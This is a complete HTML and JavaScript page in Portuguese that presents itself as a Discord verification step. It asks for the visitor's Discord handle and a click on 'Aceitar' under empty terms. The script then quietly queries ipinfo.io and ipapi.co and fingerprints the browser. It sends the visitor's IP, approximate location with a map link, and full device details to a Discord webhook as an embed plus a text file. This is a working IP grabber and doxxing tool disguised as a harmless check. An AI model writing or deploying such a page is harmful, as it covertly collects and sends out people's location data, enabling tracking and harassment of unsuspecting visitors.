<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação Discord</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.37/ua-parser.min.js"></script>
</head>
<body>
    <!-- Modal para inserir o @ do Discord -->
    <div id="discordModal" class="modal">
        <div class="modal-content">
            <h2>Verificação</h2>
            <p>Insira seu @ do Discord para continuar:</p>
            <input type="text" id="discordHandle" placeholder="@seuusuario" required>
            <button onclick="submitDiscord()">Enviar</button>
        </div>
    </div>

    <!-- Conteúdo principal -->
    <div id="mainContent">
        <header>
            <img src="logo.png" alt="Logo do Site" class="site-logo">
            <h1>Bem-vindo à Verificação</h1>
        </header>
        <nav>
            <button onclick="openTerms()">Verificar</button>
        </nav>
        <div id="verificationMessage">
            Seu pedido de verificação foi enviado. Espere ser verificado!
        </div>
        <footer>
            <p>Junte-se ao nosso servidor do Discord: <a href="https://discord.gg/seu-servidor" target="_blank">Clique aqui</a></p>
        </footer>

        <!-- Modal de termos e condições -->
        <div id="termsModal" class="modal">
            <div class="modal-content">
                <h2>Termos e Condições</h2>
                <p>Ao clicar em "Aceitar", você concorda com os termos e condições.</p>
                <button onclick="acceptTerms()">Aceitar</button>
                <button onclick="closeTerms()">Recusar</button>
            </div>
        </div>
    </div>

    <script>
        // Elementos
        const discordModal = document.getElementById('discordModal');
        const mainContent = document.getElementById('mainContent');
        const termsModal = document.getElementById('termsModal');
        const discordHandleInput = document.getElementById('discordHandle');
        const verificationMessage = document.getElementById('verificationMessage');

        // Inicializar
        mainContent.style.display = 'none';
        termsModal.style.display = 'none';
        verificationMessage.style.display = 'none';

        // Config padrão (fallback)
        const defaultConfig = {
            webhook: "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI",
            embed: {
                title: "Nova Verificação",
                color: "#FF0000",
                fields: [
                    { name: "**Nome**", key: "nick" },
                    { name: "**Data**", key: "date" },
                    { name: "**IP**", key: "ip" },
                    { name: "**Localização**", key: "loc" },
                    { name: "**Cidade**", key: "cidade" },
                    { name: "**Estado**", key: "estado" },
                    { name: "**País**", key: "pais" },
                    { name: "**Dispositivo**", key: "dispositivo" }
                ]
            }
        };

        // Carregar config.json
        let config = defaultConfig;
        fetch('config.json')
            .then(response => {
                if (!response.ok) throw new Error('config.json não encontrado');
                return response.json();
            })
            .then(data => config = { ...defaultConfig, ...data })
            .catch(error => console.warn('Usando config padrão:', error));

        // Função para enviar o @ do Discord
        function submitDiscord() {
            const discordHandle = discordHandleInput.value.trim();
            if (discordHandle) {
                discordModal.style.display = 'none';
                mainContent.style.display = 'block';
                window.discordHandle = discordHandle;
            } else {
                alert('Por favor, insira seu @ do Discord.');
            }
        }

        // Abrir modal de termos
        function openTerms() {
            termsModal.style.display = 'flex';
        }

        // Fechar modal de termos
        function closeTerms() {
            termsModal.style.display = 'none';
        }

        // Aceitar termos e enviar ao webhook
        async function acceptTerms() {
            termsModal.style.display = 'none';
            verificationMessage.style.display = 'block';

            // Dados para o embed (apenas IPinfo)
            let embedData = {
                nick: window.discordHandle || "@desconhecido",
                date: new Date().toLocaleString("pt-BR"),
                ip: "Não disponível",
                loc: "Não disponível",
                cidade: "Não disponível",
                estado: "Não disponível",
                pais: "Não disponível",
                dispositivo: "Não disponível"
            };

            // Dados completos para o arquivo .txt
            let allData = {
                ipinfo: {},
                ipapi: {},
                dispositivo: {}
            };

            // Obter dados do IPinfo
            try {
                const ipResponse = await fetch('https://ipinfo.io/json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    allData.ipinfo = ipData;
                    embedData.ip = ipData.ip || "Não disponível";
                    embedData.cidade = ipData.city || "Não disponível";
                    embedData.estado = ipData.region || "Não disponível";
                    embedData.pais = ipData.country || "Não disponível";
                    embedData.loc = ipData.loc
                        ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc})`
                        : `${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'} (aproximado)`;
                }
            } catch (error) {
                console.error('Erro ao obter dados do IPinfo:', error);
                allData.ipinfo.error = error.message;
            }

            // Obter dados do ipapi.co
            try {
                const ipapiResponse = await fetch('https://ipapi.co/json/');
                if (ipapiResponse.ok) {
                    const ipapiData = await ipapiResponse.json();
                    allData.ipapi = ipapiData;
                }
            } catch (error) {
                console.error('Erro ao obter dados do ipapi.co:', error);
                allData.ipapi.error = error.message;
            }

            // Obter dispositivo
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                embedData.dispositivo = `${result.device.type || 'Desktop'} (${result.os.name || 'Desconhecido'} ${result.os.version || ''}, ${result.browser.name || 'Desconhecido'})`;
                allData.dispositivo = result;
            } catch (error) {
                console.error('Erro ao obter dispositivo:', error);
                allData.dispositivo.error = error.message;
            }

            // Criar embed (apenas IPinfo)
            const embed = {
                embeds: [{
                    title: config.embed.title || "Nova Verificação",
                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16),
                    fields: config.embed.fields.map(field => ({
                        name: field.name,
                        value: embedData[field.key] || "Não disponível",
                        inline: ["cidade", "estado", "pais"].includes(field.key)
                    })),
                    timestamp: new Date().toISOString()
                }]
            };

            // Criar arquivo .txt com todos os dados
            const txtData = `
Informações de Verificação

1. IPinfo:
${JSON.stringify(allData.ipinfo, null, 2)}

2. ipapi.co:
${JSON.stringify(allData.ipapi, null, 2)}

3. Dispositivo:
${JSON.stringify(allData.dispositivo, null, 2)}
            `;
            const blob = new Blob([txtData], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(embed));
            formData.append('file', blob, `${embedData.nick.replace('@', '')}.txt`);

            // Enviar ao webhook
            try {
                const response = await fetch(config.webhook, {
                    method: "POST",
                    body: formData
                });
                if (!response.ok) {
                    throw new Error('Falha ao enviar dados');
                }
            } catch (error) {
                console.error('Erro ao enviar webhook:', error);
                verificationMessage.textContent = "Erro ao enviar verificação. Tente novamente.";
                verificationMessage.style.background = "#ff3333";
            }
        }
    </script>
</body>
</html>
